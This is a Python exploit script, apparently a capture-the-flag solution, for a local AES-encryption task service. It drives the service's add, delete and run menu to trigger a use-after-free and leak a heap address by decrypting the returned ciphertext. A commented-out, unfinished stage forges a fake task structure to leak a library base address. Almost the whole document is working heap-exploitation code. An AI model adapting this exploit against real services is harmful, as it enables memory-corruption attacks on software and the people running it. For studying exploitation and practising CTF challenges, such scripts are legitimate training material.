from ptrlib import *
from Crypto.Cipher import AES

def add_task_wait(task_id, mode, key, iv, size):
    assert len(key) == 0x20
    assert len(iv) == 0x10
    assert 0 < size <= 0x1000
    sock.recvuntil("Choice: ")
    sock.sendline("1")
    sock.recvuntil("id : ")
    sock.sendline(str(task_id))
    sock.recvuntil("(2): ")
    sock.sendline(str(mode))
    sock.recvuntil("Key : ")
    sock.send(key)
    sock.recvuntil("IV : ")
    sock.send(iv)
    sock.recvuntil("Size : ")
    sock.sendline(str(size))

def add_task(task_id, mode, key, iv, size, data):
    add_task_wait(task_id, mode, key, iv, size)
    sock.recvuntil("Data : ")
    sock.send(data)

def delete_task(task_id):
    sock.recvuntil("Choice: ")
    sock.sendline("2")
    sock.recvuntil("id : ")
    sock.sendline(str(task_id))
    
def go(task_id):
    sock.recvuntil("Choice: ")
    sock.sendline("3")
    sock.recvuntil("id : ")
    sock.sendline(str(task_id))

def recv_cipher():
    sock.recvuntil("Ciphertext:")
    sock.recvline()
    data = b''
    while True:
        line = sock.recvline(timeout=0.5).rstrip()
        if line == b'' or line == None:
            break
        else:
            data += bytes.fromhex(bytes2str(line.replace(b' ', b'')))
    return data

def decrypt(cipher, key, iv):
    c = AES.new(key, AES.MODE_CBC, iv)
    return c.decrypt(cipher)

sock = Socket("127.0.0.1", 4001)
#_ = input()

key = b'\xff' * 0x20
iv = b'\xff' * 0x10

# leak heap
add_task(0, 1, key, iv, 0x70, b'A' * 0x70)
add_task(1, 1, key, iv, 0x70, b'B' * 0x70)
add_task(2, 1, key, iv, 0x70, b'C' * 0x70)
delete_task(2)
go(0)
delete_task(0)
delete_task(1)
add_task(3, 1, key, iv, 0x1, b'C' * 0x1)
add_task(4, 1, key, iv, 0x1, b'C' * 0x1)

add_task_wait(2, 1, key, iv, 0x70)
cipher = recv_cipher()
addr_heap = u64(decrypt(cipher, key, iv)[:8])
sock.send(b'C' * 0x70)
logger.info("addr heap = " + hex(addr_heap))

# leak libc

"""
fake_task = b''
fake_task += p64(addr_heap - 448) # data
#fake_task += p64(0xffffffffffff0000)
fake_task += p64(0x30) # size
fake_task += p32(0x1)
fake_task += key
fake_task += iv
fake_task += b'?' * 0x14
fake_task += p64(addr_heap - 448) # ctx
fake_task += p64(3) # id
fake_task += p64(0) # next
add_task(3, 1, key, iv, 0x30, b'D' * 0x30)
add_task(4, 1, key, iv, 0x30, b'E' * 0x30)
_ = input()
go(3)
delete_task(3)
delete_task(4)
add_task(4, 1, key, iv, 0x70, fake_task)
cipher = recv_cipher()
addr_libcrypto = u64(decrypt(cipher, key, iv)[:8])
libc_base = addr_libcrypto# - 8480288
logger.info("libc base = " + hex(libc_base))
"""


sock.interactive()
